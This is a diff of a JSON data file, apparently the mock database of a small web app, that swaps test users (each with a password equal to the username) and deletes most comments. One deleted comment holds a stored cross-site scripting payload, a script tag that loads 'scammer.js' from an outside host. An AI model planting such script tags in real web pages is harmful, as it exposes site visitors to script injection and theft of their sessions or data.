@@ -7,47 +7,21 @@
       "id": 1
     },
     {
-      "username": "jill",
-      "password": "jill",
+      "username": "alice",
+      "password": "alice",
       "id": 2
     },
     {
-      "username": "sam",
-      "password": "sam",
+      "username": "trudy",
+      "password": "trudy",
       "id": 3
     }
   ],
   "comments": [
     {
-      "id": 1,
-      "username": "kek",
-      "comment": "this is a test comment"
-    },
-    {
-      "username": "bob",
-      "comment": "ok",
-      "id": 2
-    },
-    {
-      "username": "bob",
-      "comment": "he he <script src=\"https://snickdx.me:3002/scammer.js\"></script>",
-      "id": 4
-    },
-    {
-      "username": "bob",
-      "comment": "lool",
-      "id": 5
-    },
-    {
-      "username": "bob",
+      "username": "jane",
       "comment": "lol",
-      "id": 6
-    },
-    {
-      "username": "test",
-      "comment": "test",
-      "token": "lol",
-      "id": 7
+      "id": 1
     }
   ]
 }
